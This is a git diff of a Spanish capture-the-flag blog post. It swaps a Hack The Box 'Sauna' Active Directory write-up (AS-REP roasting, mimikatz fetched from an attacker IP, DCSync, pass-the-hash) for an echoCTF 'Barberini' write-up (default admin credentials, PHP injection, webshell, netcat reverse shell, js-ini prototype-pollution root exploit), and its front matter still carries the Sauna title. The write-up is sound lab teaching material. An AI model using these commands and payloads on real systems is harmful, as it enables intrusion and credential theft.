@@ -2,7 +2,7 @@
 layout: single
 title: Hack The Box - Sauna
 excerpt: "Sauna es una máquina de HTB de dificultad fácil, mediante la cual pueden practicarse técnicas clave de explotación de **Directorio Activo** que pueden presentarse en ambientes reales como ataques a kerberos (ASREPRoast), enumeración de credenciales, uso de Bloodhound para enumerar  vías potenciales para escalar privilegios, ataque DCsync, Pass-The-Hash, etc."
-date: 2022-05-19
+date: 2023-11-04
 classes: wide
 header:
   teaser: /assets/images/htb-writeup-sauna/sauna_logo.png
@@ -181,156 +181,153 @@ position: relative;
 -->
 
 ## Resumen
-
-Sauna es una máquina de HTB de dificultad fácil, mediante la cual pueden practicarse técnicas clave de explotación de **Directorio Activo** que pueden presentarse en ambientes reales como ataques a kerberos (ASREPRoast), enumeración de credenciales, uso de Bloodhound para enumerar  vías potenciales para escalar privilegios, ataque DCsync, Pass-The-Hash, etc.
+Barberini es una m&aacute;quina de la plataforma echoCTF de dificultad avanzada. Fue parte de la clasificatoria del HACKMEX6. En esta m&aacute;quina, se exploran temas relacionados con el uso de credenciales d&eacute;biles y la carga de archivos como medios para obtener acceso inicial. Adem&aacute;s, para lograr una escalaci&oacute;n de privilegios exitosa, se aprovecha una vulnerabilidad de "prototype pollution" que afecta al compilador/decompilador "ini" para Node.
 
 ## Enumeración
+Realizando un escaneo de puertos con la herramienta nmap identifiqué los siguientes puertos abiertos:<br>
+- 22 SSH
+- 1337 HTTP
+- 3306 MYSQL 
 
-Comenzaré identificando que puertos TCP están abiertos en la máquina objetivo, ejecutando un escaneo de puertos “SYN SCAN” a los 65535 puertos de la máquina mediante la herramienta nmap.
-<br>**Comando:** nmap -sS 10.10.10.175 -p- -Pn -n -vvv -T5 --min-rate 5000 -oA TCP_SCAN_10.10.10.175
-<br> <br>
+```bash
+Nmap scan report for 10.0.30.0
+Host is up, received user-set (0.29s latency).
+Scanned at 2023-09-19 18:24:49 EDT for 19s
 
-<img  src="/assets/images/htb-writeup-sauna/SYN_SCAN_TCP.png" style="width:75%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+1337/tcp open  http    syn-ack ttl 63 nginx 1.18.0
+3306/tcp open  mysql   syn-ack ttl 63 MySQL 5.5.5-10.5.19-MariaDB-0+deb11u2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+## Enumeración Web
 
-Como resultado se identificaron bastantes puertos abiertos, comunes en un controlador de dominio, adicionalmente, puede intuirse que el sistema operativo de la máquina es **Windows** debido al TTL obtenido en el resultado del escaneo (127) en caso de no estar personalizado.
-Posteriormente realice la enumeración de versiones para todos los puertos abiertos identificados con el objetivo de obtener mayor información de las tecnologías ejecutándose en cada uno de ellos.
-<br>**Comando:** <br>nmap -sV 10.10.10.175 -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49674,49677,49689,49696 -vvv -Pn -n -oA TCP_SCAN_SV_10.10.10.175
+El sitio web que tiene alojado la m&aacute;quina es el siguiente: <br>
 
-<img  src="/assets/images/htb-writeup-sauna/nmap_SV.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
+![](/assets/images/echoCTF-writeup-barberini/web.png)
 
-Adicionalmente, ejecuté **crackmapexec smb 10.10.10.175** para obtener más detalles acerca del sistema operativo, la arquitectura y el nombre de dominio de la máquina victima.
-
-<img  src="/assets/images/htb-writeup-sauna/CME.png" style="width:100%; border-radius:2px; display: block; margin-left: auto;  margin-right: auto;">
-
-## Enumeración SMB 
-
-Enumere el servicio smb con herramientas como smbclient y smbmap para validar si existían recursos compartidos a nivel de red a los cuales tuviera acceso, sin embargo no hubo éxito.
-
-<img  src="/assets/images/htb-writeup-sauna/SMB.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
-
-## Enumeración WEB
-
-El sitio web que tiene alojado la máquina representa a un banco.
-
-<img  src="/assets/images/htb-writeup-sauna/web_site.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
-
-Al encontrarse con un sitio web es recomendable saber la tecnología que están ocupando en dicho sitio, por lo cual ejecute **whatweb** la cual es una herramienta similar a **wappalyzer** para poder conocer la tecnología empleada.
-
-<img  src="/assets/images/htb-writeup-sauna/whatweb.png" style="width:100%; border-radius:2px; display: block; margin-left: auto;  margin-right: auto;">
-
-Mediante la consulta anterior obtuve información como el servidor ejecutándose en este caso un servidor IIS 10.0. <br>
-Posteriormente, navegando en el sitio web como un usuario normal tratando de identificar algo de lo cual pueda aprovecharme como atacante identifique algunos posibles usuarios, por lo cual hice una lista de ellos agregándolos con un formato: **{primer inicial del nombre}{apellido}** debido a que es algo que las empresas comúnmente hacen con sus empleados.
-
-<img  src="/assets/images/htb-writeup-sauna/web_users.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
-
-<img  src="/assets/images/htb-writeup-sauna/list_users.png" style="width:90%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
-
-## Ataque AS-REP Roasting (Kerberos) 
-
-Una vez con la lista de usuarios potenciales, probaré un ataque ASP-REP roasting  ya que aunque no conozca la contraseña de ninguno de los posibles usuarios si algunos de ellos tiene configurado la opción **DONT_REQ_PREAUTH**  es decir que no requiera autenticación previa de Kerberos puede obtenerse un hash.
-<br>Para poder realizar el ataque utilizare el script GetNPUsers.py de impacket.<br>
-**Comando:** python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip 10.10.10.175
-
-<img  src="/assets/images/htb-writeup-sauna/asrep.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
-
-Al revisar el archivo de salida del comando anterior obtenemos un hash para el usuario **fsmith**
-
-<img  src="/assets/images/htb-writeup-sauna/hash.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
-
-Ahora que tengo un hash de un usuario valido el siguiente paso es romper ese hash para obtener la contraseña en claro, para esto pueden usarse herramientas como **john the ripper** o **hashcat**, en este caso usare hashcat  haciendo uso del diccionario rockyou.txt.
+Para obtener más información acerca de las tecnologías empleadas en el sitio web utilicé la herramienta **whatweb**.
 <br>
-**Comando:** hashcat --force -m 18200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+```bash
+root@kali:~# whatweb http://10.0.30.0:1337/
+http://10.0.30.0:1337/ [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[oretnom23@gmail.com], HTML5, HTTPServer[nginx/1.18.0], IP[10.0.30.0], JQuery, Script, Title[Men&apos;s Salon Management System - PHP], nginx[1.18.0]
+```
 
-<img  src="/assets/images/htb-writeup-sauna/pass.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
+Mediante un escaneo de archivos y directorios utilizando la herramienta wfuzz identifique los siguientes directorios en la pagina web.
 
-El siguiente paso es validar las credenciales obtenidas utilizando crackmapexec en los servicios smb y winrm.
+![](/assets/images/echoCTF-writeup-barberini/wfuzz.png)
 
-<img  src="/assets/images/htb-writeup-sauna/credentials.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
+navegando en el sitio web como un usuario com&uacute;n, identifique el panel de administraci&oacute;n y logr&oacute; acceder utilizando las credenciales **admin:admin123**
 
-En vista de que las credenciales son validas iniciare sesión por winrm utilizando la herramienta evil-winrm para obtener una shell en la máquina victima como el usuario fsmith.
+![](/assets/images/echoCTF-writeup-barberini/dash.png)
 
-<img  src="/assets/images/htb-writeup-sauna/shell.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
+Dentro del panel de administraci&oacute;n, como parte de las primeras pruebas, intent&oacute; cargar un archivo malicioso en la p&aacute;gina web; sin embargo, no tuve &eacute;xito. Posteriormente inserte c&oacute;digo PHP en la secci&oacute;n About us sin embargo al consultar la p&aacute;gina principal el c&oacute;digo PHP no se interpreto
 
-Una vez dentro de la máquina puede visualizar la bandera de usuario.
+![](/assets/images/echoCTF-writeup-barberini/about.png)
 
-<img  src="/assets/images/htb-writeup-sauna/flag.png" style="width:75%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
+Nuevamente inserte c&oacute;digo PHP pero esta vez intercepte la solicitud con burp y pude ver que se estaban agregando comentarios para evitar que el c&oacute;digo PHP se interpretara correctamente
 
-## Escalada de privilegios fsmith --> svc_loanmgr
+![](/assets/images/echoCTF-writeup-barberini/burp.png)
 
-Una vez que gane acceso a la máquina cargue el script WinPEAS.exe (https://github.com/carlospolop/PEASS-ng/releases/tag/20220417) utilizando la opción upload  de winrm  para enumerar el sistema en busca de vías potenciales para escalar privilegios, convertirnos en otro usuario o bien obtener información sensible del sistema.
+As&iacute;­ que, modifiqu&eacute; el codigo PHP de manera adecuada, eliminando los comentarios HTML, y luego la envi&oacute; al servidor.
 
-<img  src="/assets/images/htb-writeup-sauna/winpeas.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
+![](/assets/images/echoCTF-writeup-barberini/php.png)
 
-El resultado del script revela la contraseña en claro del usuario **svc_loanmanager**.
+Al verificar la p&aacute;gina principal, not&eacute; que el c&oacute;digo PHP se interpret&aacute; correctamente
 
-<img  src="/assets/images/htb-writeup-sauna/svc_pass.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
+![](/assets/images/echoCTF-writeup-barberini/phpp.png)
 
-Utilizando el comando net users corrobore que dicho usuario existe en la máquina unicamente con un ligero cambio en el nombre **svc_loanmgr** así que nuevamente valide las credenciales obtenidas con crackmapexec.
+Una vez que confirm&eacute; que el c&oacute;digo PHP pod&iacute;­a interpretarse, cargu&eacute; una webshell en la p&aacute;gina y logr&eacute; ejecutar comandos
 
-<img  src="/assets/images/htb-writeup-sauna/net_user.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
+![](/assets/images/echoCTF-writeup-barberini/ws.png)
 
-<img  src="/assets/images/htb-writeup-sauna/cme_svc.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
+Luego, verifiqu&eacute; que la m&aacute;quina tuviera Netcat instalado utilizando el comando **which nc** y proced&iacute;­ a enviar una reverse shell con Netcat
 
-Una vez que descubrí que las credenciales son validas en la maquina inicie, sesión con el usuario sv_loanmgr mediante evil-winrm.
-	
-<img  src="/assets/images/htb-writeup-sauna/shell_svc.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
+![](/assets/images/echoCTF-writeup-barberini/rs.png)
+
+```bash
+┌──(root@kali)-[/opt/Reverse Shell]
+└─# nc -lvp 443  
+listening on [any] 443 ...
+10.0.30.0: inverse host lookup failed: Unknown host
+connect to [10.10.5.110] from (UNKNOWN) [10.0.30.0] 40860
+```
+
+Para trabajar de manera m&aacute;s c&oacute;moda, realic&eacute; un ajuste en la TTY
+
+```bash
+┌──(root@kali)-[/opt/Reverse Shell]
+└─# nc -lvp 443  
+listening on [any] 443 ...
+10.0.30.0: inverse host lookup failed: Unknown host
+connect to [10.10.5.110] from (UNKNOWN) [10.0.30.0] 40860
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+www-data@barberini:~/html$ ^Z
+zsh: suspended  nc -lvp 443
+                                                                                                                                   
+┌──(root@kali)-[/opt/Reverse Shell]
+└─# stty raw -echo; fg   
+[1]  + continued  nc -lvp 443
+                             reset
+reset: unknown terminal type unknown
+Terminal type? xterm
+www-data@barberini:~/html$ export TERM=xterm
+www-data@barberini:~/html$ export SHELL=bash
+www-data@barberini:~/html$ 
+```
 
 ## Escalada de privilegios
-Para enumerar información del directorio activo y poder visualizar en formato gráfico vías potenciales para escalar privilegios ejecutare la herramienta **bloodhound**.
-<br>
-**Instalación:**
-<br>
-- apt install neo4j bloodhound -y 
 
-Una vez instalado ejecutare la base de datos para que se sincronice con bloodhound con el **comando:** neo4j console, esto levantara un servicio en el puerto 7474 del locahost donde se tendrán que configurar las credenciales para poder acceder a bloodhound.
+Una vez dentro de la m&aacute;quina, ejecutando **sudo -l**, pude ver que puedo ejecutar el binario /usr/local/bin/jini como propiedad de root sin necesidad de proporcionar contrase&ntilde;a.
 
-<img  src="/assets/images/htb-writeup-sauna/console_neo4j.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
+```bash
+www-data@barberini:~/html$ sudo -l
+Matching Defaults entries for www-data on barberini:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
-Las credenciales por defecto son **neo4j:neo4j** y una vez que ingresas lo ideal es cambiar dicha contraseña ya que serán las credenciales para ingresar a bloodhound.
+User www-data may run the following commands on barberini:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/jini
+``` 
+El contenido del binario es el siguiente:
 
-Para poder visualizar gráficamente todas las vías potenciales para escalar privilegios cargare y ejecutare el script **Sharphound.ps1** en la máquina victima el cual recolectara cierta información relevante almacenándola en un archivo .zip
+```bash
+www-data@barberini:~/html$ cat /usr/local/bin/jini
+#!/usr/bin/env node
+var fs = require('fs')
+var ini = require('js-ini')
+const myArgs = process.argv.slice(2);
+if (myArgs.length < 1) {
+  console.error(`provide a ini file to parse`)
+  return
+}
 
-<img  src="/assets/images/htb-writeup-sauna/sharphound.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
+var parsed = ini.parse(fs.readFileSync(myArgs[0], 'utf-8'))
+if(isAdmin){
+  console.log("Awesome!!!")
+  require('child_process').execSync(
+    '/bin/bash -l -p',
+    { stdio: 'inherit' }
+  );
+}
+```
 
-Posteriormente descargare el archivo zip a mi máquina de atacante y lo cargare en bloodhound.<br> Una vez en bloodhound Podemos realizar consultas como saber que usuarios son AS-REP Roaestables, que usuarios son Kerberoastebales, cual es la forma más rápida para convertirte en usuario administrador del dominio, etc.
-<br>
-Al realizar una consulta DCSync para ver si algún usuario existente puede ejecutar un ataque DCSync. Revelo que el usuario svc_loanmgr tiene los privilegios **GetCahngesAll** y **GetChanges** lo cual permite ejecutar un ataque DCSync, es decir que dicho usuario tiene el privilegio de extraer el hash del usuario administrador.
+Para poder escalar privilegios utilice la siguiente referencia https://security.snyk.io/vuln/SNYK-JS-INI-1048974 donde indican que el codificador/decodificador ini para node se ve afectada por una vulnerabilidad Prototype Pollution. El payload que utilice para explotar la vulnerabilidad fue el siguiente:
 
-<img  src="/assets/images/htb-writeup-sauna/bloodhound.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
+```bash
+[__proto__]
+isAdmin = "polluted"
+```
+Por &Uacute;ltimo, lo transfer&iacute;­ a la maquina v&iacute;­ctima y ejecute sudo **/usr/local/bin/jini payload.ini** para poder obtener una Shell como el usuario root
 
-Al hacer click derecho y seleccionando la opcion de **ayuda**, bloodhound brinda mas información sobre como ejecutar de dicho ataque.
+```bash
+www-data@barberini:/tmp$ sudo /usr/local/bin/jini payload.ini 
+Awesome!!!
+root@barberini:/tmp# whoami
+root
+root@barberini:/tmp# 
 
-<img  src="/assets/images/htb-writeup-sauna/blood_info.png" style="width:75%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
-
-## DCSync - secretsdump
-Una forma de hacer un ataque DCSYnc es usando la utilidad **secretsdump** de impacket, esta es una forma menos intrusiva aunque genera tráfico en la red.<br>
-**Comando:**<br>
-impacket-secretsdump -just-dc-ntlm EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround\!@10.10.10.175
-
-<img  src="/assets/images/htb-writeup-sauna/secretsdump.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
-
-## DCSync - Mimikatz
-
-Otra forma de realizar este ataque es utilizando mimikatz así que cargaré mimikatz.exe en la máquina comprometida levantando un servidor temporal con python en mí máquina de atacante y transfiriéndolo a la máquina víctima con el siguiente comando:
-**iwr -uri http://10.10.14.22:1234/mimikatz.exe -OutFile mimikatz.exe**
-
-<img  src="/assets/images/htb-writeup-sauna/mimikatz.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
-
-Una vez que mimikatz está cargado ejecutare el siguiente comando para realizar el ataque DCSync.
-**C:\Users\svc_loanmgr\Documents\mimikatz.exe 'lsadump::dcsync /domain:egotistical-bank.local /user:Administrator' exit**
-
-<img  src="/assets/images/htb-writeup-sauna/mimikatz_hash.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
-
-## Pass-The-Hash
-
-Ahora que tengo el hash NTLM del administrador podría tartar de romper la contraseña por fuerza bruta en caso de que sea débil o bien hacer un **Pass-The-Hash** para tener una shell como administrador, en este caso utilizaré evil-winrm para hacerlo ejecutando:
-<br>
-**evil-winrm -u 'Administrator' -H '823452073d75b9d1cf70ebdf86c7f98e' -i 10.10.10.175**
-
-<img  src="/assets/images/htb-writeup-sauna/administrator.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
-
-Por último visualizar la bandera de administrador y Domain Controller comprometido :D!!
-
-<img  src="/assets/images/htb-writeup-sauna/fadmin.png" style="width:80%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">
+```
 
 
